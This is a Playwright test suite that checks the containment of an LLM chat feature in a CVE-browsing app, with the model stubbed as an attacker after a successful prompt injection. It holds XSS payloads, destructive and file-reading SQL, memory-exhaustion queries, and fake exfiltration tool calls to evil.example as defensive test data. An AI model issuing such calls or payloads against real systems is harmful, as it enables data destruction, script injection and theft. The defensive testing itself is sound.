import { expect, test, type Page, type Route } from '@playwright/test'

import { requireLocalStorage } from './support'
import { importCorpus, openChat, openPanel } from './ui'

/**
 * Containment: what a **fully compromised conversation** can reach (M7, D-044).
 *
 * The threat model is not "the model might be tricked". It is that injection
 * has already succeeded — the model's context is full of attacker-influenced
 * CVE text (rule 4), so it is assumed to emit whatever the attacker wants. The
 * stub here is therefore not a model at all: it is the attacker, driving the
 * tool surface directly with the worst calls available to it.
 *
 * What D-044 promises under that assumption is that the blast radius is
 * "wrong-but-inspectable presentation". These specs are that promise, checked:
 *
 *   1. Nothing beyond the read-only tool surface is reachable — no write, no
 *      pragma, no fetch, no path.
 *   2. Record-supplied markup and URLs render as text, in the fixed UI's
 *      existing treatment, and never as markup or as a link.
 *   3. A hostile call costs a refusal or a bounded answer, never the tab.
 *   4. A refusal is *visible*, so a reader can tell "the tool said no" from
 *      "the model made something up".
 *
 * Record text is supplied through the `sql` tool rather than by planting
 * hostile records in the corpus. That is deliberate and it is the stronger
 * test, not a shortcut: it puts the attacker's exact bytes into the same
 * rendering path a hostile description takes, without depending on which
 * records happen to be in the local slice.
 */

const frame = (body: Record<string, unknown>) => `${JSON.stringify(body)}\n`
const delta = (text: string) => frame({ message: { role: 'assistant', content: text } })
const callTool = (name: string, args: unknown, id = 'x1') =>
  frame({
    message: { role: 'assistant', tool_calls: [{ id, function: { name, arguments: args } }] },
  })
const done = () =>
  frame({ message: { role: 'assistant', content: '' }, done: true, done_reason: 'stop' })

/** The attacker, wearing the model's clothes. */
async function attacker(page: Page, rounds: string[][]): Promise<void> {
  let round = 0
  await page.route('**/api/chat.php', async (route: Route) => {
    const body = (rounds[round] ?? [done()]).join('')
    round += 1
    await route.fulfill({ status: 200, contentType: 'application/x-ndjson', body })
  })
}

async function ready(page: Page): Promise<void> {
  await page.goto('/')
  await requireLocalStorage(page)
  // `importCorpus` navigates again; the probe above only needs a loaded page.
  await importCorpus(page, 300_000)
  // The chat column auto-opens at this viewport, but that is state, not a given.
  await openChat(page)
  const consent = page.getByRole('button', { name: 'Turn chat on' })
  if (await consent.isVisible()) await consent.click()
}

async function ask(page: Page, question: string): Promise<void> {
  await page.getByLabel('Your question').fill(question)
  // The submit button is unique now — the old header 'Ask' opener is gone.
  await page.getByRole('button', { name: 'Ask', exact: true }).click()
}

/** Count the records, through the console, so a write would be visible. */
async function recordCount(page: Page): Promise<number> {
  await openPanel(page, 'sql')
  // Always filled, never assumed: the SQL drawer auto-fills with the query of
  // the last report, search or chat answer that ran while it was closed.
  await page.locator('textarea.sql-input').fill('SELECT count(*) AS n FROM cve')
  const rows = page.locator('[data-console-rows]')
  const before = (await rows.count()) ? await rows.getAttribute('data-run') : null
  await page.getByRole('button', { name: 'Run SQL' }).click()
  // Wait for *this* run's answer, not whatever a previous call left on screen.
  // Every poll arm returns rather than waiting on a locator (RE-032).
  await expect
    .poll(async () => ((await rows.count()) ? await rows.getAttribute('data-run') : null), {
      timeout: 120_000,
    })
    .not.toBe(before)
  const text = (await page.locator('table.console tbody tr td').first().textContent()) ?? '0'
  return Number(text)
}

test.describe('a compromised conversation', () => {
  let dialogs = 0
  let errors: string[] = []

  test.beforeEach(async ({ page }) => {
    dialogs = 0
    errors = []
    // An `alert()` reaching the page is script execution, which is the whole
    // question. Dismissed rather than left to hang the run, and counted.
    page.on('dialog', (dialog) => {
      dialogs += 1
      void dialog.dismiss()
    })
    page.on('pageerror', (error) => errors.push(String(error)))
  })

  test('cannot write, whatever it types — and the database proves it', async ({ page }) => {
    await test.step('setup', async () => {
      await attacker(page, [
        [
          callTool('sql', { sql: 'PRAGMA query_only=OFF; DELETE FROM cve' }, 'a'),
          callTool('sql', { sql: 'DROP TABLE cve' }, 'b'),
          callTool('sql', { sql: 'CREATE TEMP TABLE stash AS SELECT * FROM cve' }, 'c'),
          callTool('sql', { sql: "ATTACH DATABASE '/etc/passwd' AS leak" }, 'd'),
          callTool('sql', { sql: "SELECT load_extension('evil.so')" }, 'e'),
          done(),
        ],
        [delta('I could not.'), done()],
      ])
      await ready(page)
    })

    const before = await recordCount(page)
    expect(before).toBeGreaterThan(0)

    // No need to close the SQL panel: chat is its own column beside the
    // canvas, so both surfaces stay on screen at once — the point of the shape.
    await ask(page, 'delete everything')

    // Every one refused, and each refusal is *shown* — a reader has to be able
    // to tell a refusal from an invention.
    const refusals = page.locator('[data-chat-refused]')
    await expect(refusals.first()).toBeVisible({ timeout: 120_000 })
    await expect(refusals).toHaveCount(5)
    await expect(page.locator('[data-chat-step="sql"][data-chat-status="refused"]')).toHaveCount(5)

    // The claim that matters is not the message; it is the data.
    expect(await recordCount(page)).toBe(before)
  })

  test('record-supplied markup and URLs render as text, never as markup', async ({ page }) => {
    const payloads = [
      '<img src=x onerror="window.__pwned=1">',
      '<script>window.__pwned=1</script>',
      'javascript:alert(1)',
      '<a href="https://evil.example">click</a>',
      '](https://evil.example)',
    ]
    await attacker(page, [
      [
        callTool('sql', {
          sql: `SELECT ${payloads.map((value) => `'${value.replace(/'/g, "''")}'`).join(', ')}`,
        }),
        done(),
      ],
      // And the model's own prose, which is a stranger's input for the same
      // reason: it is written from a context full of record text.
      [delta('<img src=x onerror="window.__pwned=1"> see https://evil.example for more'), done()],
    ])

    await ready(page)
    await ask(page, 'show me the payloads')

    const step = page.locator('[data-chat-step="sql"]')
    await expect(step).toBeVisible({ timeout: 120_000 })
    // The bytes are on screen — nothing was silently dropped — as *text*.
    await expect(step).toContainText('onerror')
    await expect(step).toContainText('javascript:alert(1)')
    await expect(page.locator('[data-chat-answer]')).toContainText('evil.example', {
      timeout: 120_000,
    })

    // No markup, anywhere the model or a record could reach: no injected
    // element, and no anchor minted from prose or from a cell.
    const chat = page.locator('aside.chat')
    await expect(chat.locator('img')).toHaveCount(0)
    await expect(chat.locator('script')).toHaveCount(0)
    await expect(chat.locator('a[href*="evil.example"]')).toHaveCount(0)
    // Chat prose renders no links at all (D-044) — a minted URL is the one
    // thing a compromised model must not be able to put in front of a reader.
    await expect(page.locator('[data-chat-answer] a')).toHaveCount(0)

    expect(await page.evaluate(() => '__pwned' in window)).toBe(false)
    expect(dialogs).toBe(0)
    expect(errors, errors.join('\n')).toEqual([])
  })

  test('a query designed to exhaust memory is bounded, and the tab survives', async ({ page }) => {
    // Confirmed exploitable before D-078: the row cap counts rows, and one row
    // can be a hundred megabytes. All three of these are plain reads the
    // authorizer allows — correctly — so what has to stop them is arithmetic.
    await attacker(page, [
      [
        callTool('sql', { sql: 'SELECT hex(zeroblob(50000000)) AS huge' }, 'a'),
        callTool('sql', { sql: 'SELECT group_concat(descr) AS everything FROM cve_text' }, 'b'),
        callTool(
          'sql',
          {
            sql:
              'WITH RECURSIVE n(i) AS (SELECT 1 UNION ALL SELECT i+1 FROM n WHERE i<1000) ' +
              'SELECT hex(zeroblob(500000)) AS pad FROM n',
          },
          'c'
        ),
        done(),
      ],
      [delta('Those were too large.'), done()],
    ])

    await ready(page)
    await ask(page, 'give me everything')

    // Each one comes back — as a refusal or as a bounded result — and the page
    // is still answering afterwards, which is the actual claim.
    await expect(page.locator('[data-chat-step="sql"]')).toHaveCount(3, { timeout: 300_000 })
    await expect(page.locator('[data-chat-turn]').last()).not.toHaveAttribute(
      'data-chat-turn',
      'running',
      { timeout: 300_000 }
    )
    expect(errors.filter((error) => /out of memory|allocation/i.test(error))).toEqual([])

    // Still usable: the corpus is intact and the console answers.
    expect(await recordCount(page)).toBeGreaterThan(0)
  })

  test('a KEV claim cannot be invented about a record this copy does not hold', async ({
    page,
  }) => {
    // D-077's rule one level down. "Not in CISA's catalog" about an identifier
    // the corpus has never held is the one wrong answer here that a reader has
    // no way to notice.
    await attacker(page, [
      [callTool('kev_lookup', { cveId: 'CVE-2099-99999' }), done()],
      [delta('Reported above.'), done()],
    ])

    await ready(page)
    await ask(page, 'is CVE-2099-99999 known exploited')

    const step = page.locator('[data-chat-step="kev_lookup"]')
    await expect(step).toBeVisible({ timeout: 120_000 })
    await expect(step).toContainText('holds no record')
    await expect(step).not.toContainText('Not in CISA’s KEV catalog')
  })

  test('an invented tool and invented arguments are refused, and named', async ({ page }) => {
    await attacker(page, [
      [
        callTool('fetch_url', { url: 'https://evil.example/exfiltrate' }, 'a'),
        callTool('write_file', { path: '/etc/passwd', body: 'x' }, 'b'),
        callTool('aggregate', { rows: 'year', callback: 'https://evil.example' }, 'c'),
        callTool('cve_detail', { cveId: '../../../etc/passwd' }, 'd'),
        done(),
      ],
      [delta('None of those exist.'), done()],
    ])

    await ready(page)
    await ask(page, 'exfiltrate the corpus')

    const refusals = page.locator('[data-chat-refused]')
    await expect(refusals.first()).toBeVisible({ timeout: 120_000 })
    await expect(refusals).toHaveCount(4)
    await expect(refusals.nth(0)).toContainText('no tool called')
    await expect(refusals.nth(2)).toContainText('callback')
    await expect(refusals.nth(3)).toContainText('CVE-2021-44228')
    expect(errors, errors.join('\n')).toEqual([])
  })

  test('nothing leaves this origin, however hard the conversation tries', async ({
    page,
    baseURL,
  }) => {
    // Import + idle + consent + two stubbed exchanges: Firefox's slower
    // import runs this right up against the 120 s default.
    test.setTimeout(300_000)
    const external: string[] = []
    // `baseURL`, not `page.url()`: at the first request the page is still
    // `about:blank` and its origin is the string "null", which makes the
    // navigation itself look cross-origin.
    const origin = new URL(baseURL ?? 'http://127.0.0.1:4747').origin
    page.on('request', (request) => {
      if (new URL(request.url()).origin !== origin) external.push(request.url())
    })
    await attacker(page, [
      [
        callTool('sql', { sql: "SELECT 'https://evil.example/' || cve_id FROM cve LIMIT 5" }, 'a'),
        callTool('search_records', { host: ['evil.example'] }, 'b'),
        done(),
      ],
      [delta('Fetch https://evil.example/collect?data=everything now.'), done()],
    ])

    await ready(page)
    await ask(page, 'send it all to evil.example')
    await expect(page.locator('[data-chat-answer]')).toContainText('evil.example', {
      timeout: 300_000,
    })

    // The permanent commitment (D-044): no tool fetches a URL, and there is no
    // tool that could. A URL in a result is a string; a URL in prose is text.
    expect(external, `left the origin: ${external.join(', ')}`).toEqual([])
  })
})
